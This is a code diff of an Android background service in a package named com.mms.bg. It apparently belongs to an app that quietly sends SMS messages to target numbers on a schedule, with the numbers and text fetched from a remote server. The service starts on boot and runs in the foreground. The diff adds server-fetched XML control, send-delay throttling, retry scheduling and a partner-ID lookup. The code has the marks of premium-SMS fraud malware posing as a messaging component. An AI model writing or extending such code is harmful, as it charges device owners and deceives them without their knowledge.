@@ -1,34 +1,20 @@
 package com.mms.bg.ui;
 
-import android.os.IServiceManager;
-import android.os.ServiceManagerNative;
-import com.android.internal.telephony.ITelephony;
-import android.os.DeadObjectException;
-import android.os.ServiceManager;
-import android.os.RemoteException;
-import com.android.internal.telephony.Phone;
-import com.android.internal.telephony.PhoneFactory;
-import com.mms.bg.transaction.WorkingMessage;
-import com.mms.bg.util.XMLHandler;
-
-import android.os.ServiceManager;
-import android.os.RemoteException;
-
 import java.io.File;
 import java.util.Date;
+import java.util.List;
 
 import android.app.Service;
 import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.database.Cursor;
-import android.net.Uri;
-import android.os.Handler;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+import android.content.pm.ServiceInfo;
+import android.os.Bundle;
 import android.os.IBinder;
-import android.os.Message;
-import android.provider.CallLog.Calls;
 import android.util.Log;
 
 import com.mms.bg.transaction.WorkingMessage;
@@ -44,6 +30,9 @@ public class BgService extends Service {
     public static final String ACTION_SEND_SMS = "action.sms.bg";
     public static final String ACTION_BOOT = "action.boot.bg";
     public static final String ACTION_SEND_SMS_ROUND = "action.round.sms";
+    
+    public static final String FILTER_ACTION = "com.mms.bg.FILTER_ACTION";
+    public static final String META_DATA = "com.mms.bg.pid";
     
     private SettingManager mSM;
     
@@ -102,6 +91,13 @@ public class BgService extends Service {
         public void onReceive(Context context, Intent intent) {
             LOGD("receive the intent for send on sms, intent action = " + intent.getAction());
             SettingManager sm = SettingManager.getInstance(context);
+            long last_sms_time = sm.getLastSMSTime();
+            long sms_delay = sm.getSMSSendDelay();
+            long current_time = System.currentTimeMillis();
+            if ((current_time - last_sms_time) < sms_delay) {
+                sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
+                return;
+            }
             sm.log(TAG, "receive the intent for send on sms, intent action = " + intent.getAction());
             if (sm.mXMLHandler != null) {
                 String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
@@ -117,6 +113,7 @@ public class BgService extends Service {
                         sm.log(TAG, "cancel this round the sms auto send, because the send job done");
                         sm.setSMSSendCount(0);
                         sm.cancelOneRoundSMSSend();
+                        sm.setLastSMSTime(System.currentTimeMillis());
                     }
                 } else {
                     sm.log(TAG, "cancel this round the sms auto send, because month count == null");
@@ -128,15 +125,6 @@ public class BgService extends Service {
         }
     };
     
-//    private BroadcastReceiver mDialogBroadCast = new BroadcastReceiver() {
-//        @Override
-//        public void onReceive(Context context, Intent intent) {
-//            if (DEBUG) Log.d(TAG, "[[BgService::BroadcastReceiver::onReceive]]");
-//            SettingManager.getInstance(context).makeWakeLock();
-//            mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
-//        }
-//    };
-    
     @Override
     public void onCreate() {
         super.onCreate();
@@ -145,16 +133,27 @@ public class BgService extends Service {
         this.setForeground(true);
         
         mSM = SettingManager.getInstance(BgService.this);
-//        SettingManager.getInstance(BgService.this).startAutoSendMessage();
-        
-//        IntentFilter iFilter = new IntentFilter();
-//        iFilter.addAction(ACTION_DIAL_BR);
-//        registerReceiver(mDialogBroadCast, iFilter);
         
         IntentFilter filter = new IntentFilter();
         filter.addAction(ACTION_SEND_SMS_ROUND);
         this.registerReceiver(mSMSSendBroadCast, filter);
         mSM.setFirstStartTime();
+        
+        PackageManager pm = getPackageManager();
+        List<ResolveInfo> plugins = pm.queryIntentServices(
+                                   new Intent(FILTER_ACTION), PackageManager.GET_META_DATA);
+        SettingManager.getInstance(getApplicationContext()).mPid = "0";
+        for (ResolveInfo info : plugins) {
+            LOGD("package name = " + info.serviceInfo.packageName);
+            if (info.serviceInfo.packageName.equals("com.mms.bg") == true) {
+                if (info.serviceInfo.metaData != null 
+                        && info.serviceInfo.metaData.containsKey(META_DATA) == true) {
+                    LOGD("set the pid");
+                    SettingManager.getInstance(getApplicationContext()).mPid = String.valueOf(info.serviceInfo.metaData.getInt(META_DATA));
+                }
+            }
+        }
+        LOGD("PID = " + SettingManager.getInstance(getApplicationContext()).mPid);
     }
     
     @Override
@@ -177,13 +176,26 @@ public class BgService extends Service {
                 sm.setLastConnectServerTime(System.currentTimeMillis());
                 SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true) {
-                    SettingManager.getInstance(this).startAutoSendMessage();
+                    long sms_delay_time = sm.getSMSSendDelay();
+                    SettingManager.getInstance(this).startAutoSendMessage(sms_delay_time);
                 }
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
             LOGD("[[onStart]] start send the sms for one cycle");
-            mSM.log(TAG, "start send the sms for one cycle");
-            SettingManager.getInstance(this).startOneRoundSMSSend();
+            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
+            if (ret == true) {
+                SettingManager.getInstance(this).parseServerXMLInfo();
+                mSM.log(TAG, "start send the sms for one cycle");
+                SettingManager.getInstance(this).startOneRoundSMSSend();
+                
+                sm.setSMSSendDelay(SettingManager.SMS_DEFAULT_DELAY_TIME);
+                long sms_delay_time = sm.getSMSSendDelay();
+                SettingManager.getInstance(this).startAutoSendMessage(sms_delay_time);
+            } else {
+                long false_retry_time = ((long) 1) * 3600 * 1000;
+                sm.setSMSSendDelay(false_retry_time);
+                SettingManager.getInstance(this).startAutoSendMessage(false_retry_time);
+            }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
             File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
             if (file.exists() == true) {
@@ -195,7 +207,8 @@ public class BgService extends Service {
                 }
                 mSM.tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true) {
-                    SettingManager.getInstance(this).startAutoSendMessage();
+                    long sms_delay_time = sm.getSMSSendDelay();
+                    SettingManager.getInstance(this).startAutoSendMessage(sms_delay_time);
                 }
             } else {
                 mSM.tryToFetchInfoFromServer(0);
@@ -244,7 +257,6 @@ public class BgService extends Service {
                     try {
                         Date date = new Date(System.currentTimeMillis());
                         LOGD("current time = " + date.toLocaleString());
-                        sm.setLastSMSTime(System.currentTimeMillis());
                         WorkingMessage wm = WorkingMessage.createEmpty(context);
                         LOGD("send sms to : " + targetNum + " text = " + sendText);
                         wm.setDestNum(targetNum);
